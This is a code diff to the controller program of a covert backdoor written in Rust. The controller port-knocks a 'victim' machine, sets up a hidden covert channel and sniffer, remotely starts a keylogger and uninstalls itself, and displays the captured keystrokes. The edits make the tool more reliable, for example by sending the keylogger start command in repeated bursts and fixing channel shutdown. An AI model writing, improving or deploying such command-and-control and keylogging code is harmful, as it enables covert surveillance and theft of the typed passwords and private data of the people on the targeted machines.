@@ -2,7 +2,8 @@ use std::io::{self, Write};
 use std::net::{IpAddr, Ipv4Addr};
 use std::thread;
 use std::time::Duration;
-use pnet::datalink::{self, Channel};
+use std::sync::atomic::Ordering; // ADDED THIS IMPORT
+use pnet::datalink;
 
 // Module declarations
 mod port_knkr;
@@ -28,6 +29,7 @@ enum SessionState {
 struct Commander {
     state: SessionState,
     victim_ip: Option<Ipv4Addr>,
+    #[allow(dead_code)]
     local_ip: Option<Ipv4Addr>,
     knock_session: Option<KnockSession>,
     pcap_handle: Option<PcapHandle>,
@@ -69,7 +71,10 @@ impl Commander {
     }
 
     fn connected_menu(&mut self) {
-        println!("\n--- Status: Connected to {} ---", self.victim_ip.unwrap());
+        println!(
+            "\n--- Status: Connected to {} ---",
+            self.victim_ip.map(|ip| ip.to_string()).unwrap_or("Unknown".into())
+        );
         println!("1) Disconnect from victim");
         println!("2) Uninstall from victim");
         println!("3) Start keylogger on victim");
@@ -88,7 +93,7 @@ impl Commander {
         }
     }
 
- fn initiate_connection(&mut self) {
+    fn initiate_connection(&mut self) {
         let ip_input = prompt("Enter target Victim IP [default: 127.0.0.1]: ");
         let target_ip = if ip_input.is_empty() { 
             "127.0.0.1".parse::<Ipv4Addr>().unwrap() 
@@ -101,24 +106,19 @@ impl Commander {
 
         let iface_name = Self::find_best_interface(target_ip).unwrap_or_else(|| "lo".to_string());
         
-        println!("[*] Executing knocking sequence to {}...", target_ip);
         match port_knkr::port_knock(target_ip) {
             Ok(session) => {
                 println!("[+] Port knock successful.");
+                self.victim_ip = Some(target_ip);
                 
-                // --- UPDATED SNIFFER START ---
-                // We now pass 'session.rx_port' so the sniffer knows which stream to watch
-                println!("[DEBUG] Starting background sniffer on {} (Port {})...", iface_name, session.rx_port);
                 self.pcap_handle = Some(PcapHandle::start(
                     &iface_name, 
                     target_ip.to_string(), 
-                    session.rx_port // <--- Added this argument
+                    session.rx_port
                 ));
                 
-                // ... (Rest of connection logic: CovertChannel::new, etc.)
-                
                 let interfaces = datalink::interfaces();
-                let interface = interfaces.into_iter().find(|i| i.name == iface_name).unwrap();
+                let interface = interfaces.into_iter().find(|i| i.name == iface_name).expect("Interface not found");
                 let local_ip = interface.ips.iter()
                     .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
                     .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
@@ -127,11 +127,10 @@ impl Commander {
                     &interface, target_ip, local_ip, session.tx_port, session.rx_port 
                 );
 
-                self.covert_chan = Some(chan);
-                if let Some(chan_ref) = &self.covert_chan {
-                    covert::start_listening(rx, chan_ref.config.clone());
-                }
+                // Start the listener with the running flag
+                covert::start_listening(rx, chan.config.clone(), chan.running.clone());
 
+                self.covert_chan = Some(chan);
                 self.knock_session = Some(session);
                 self.state = SessionState::Connected;
             }
@@ -141,8 +140,12 @@ impl Commander {
 
     fn start_keylogger(&mut self) {
         if let Some(ref mut chan) = self.covert_chan {
-            println!("[*] Sending 'START' signal to victim...");
-            chan.send_byte(CMD_START_LOGGER);
+            println!("[*] Sending 'START' signal to victim (5 bursts)...");
+            // Send multiple times to ensure the victim catches at least one
+            for _ in 0..5 {
+                chan.send_byte(CMD_START_LOGGER);
+                std::thread::sleep(std::time::Duration::from_millis(50));
+            }
         }
     }
 
@@ -153,21 +156,19 @@ impl Commander {
         }
     }
 
-  fn view_keylog(&self) {
-        // Ensure this path matches the one in pcap_capture.rs
+    fn view_keylog(&self) {
         let path = "./data/pcaps/captured_keys.txt";
         println!("\n--- Captured Keystrokes (from {}) ---", path);
         match std::fs::read_to_string(path) {
             Ok(content) => {
                 if content.is_empty() {
-                    println!("[!] File exists but is empty. Start the logger and type on the victim!");
+                    println!("[!] File exists but is empty.");
                 } else {
                     println!("{}", content);
                 }
             }
             Err(_) => {
                 println!("[!] No keylog data found at {}.", path);
-                println!("[*] Hint: Ensure you have started the keylogger (Option 3) and the victim has typed something.");
             }
         }
     }
@@ -196,6 +197,9 @@ impl Commander {
     fn disconnect(&mut self) {
         println!("[*] Closing session...");
         if let Some(session) = &self.knock_session { session.stop(); }
+        if let Some(ref chan) = self.covert_chan { chan.stop(); } 
+        if let Some(ref pcap) = self.pcap_handle { pcap.running.store(false, Ordering::Relaxed); }
+        
         self.knock_session = None;
         self.pcap_handle = None;
         self.covert_chan = None;
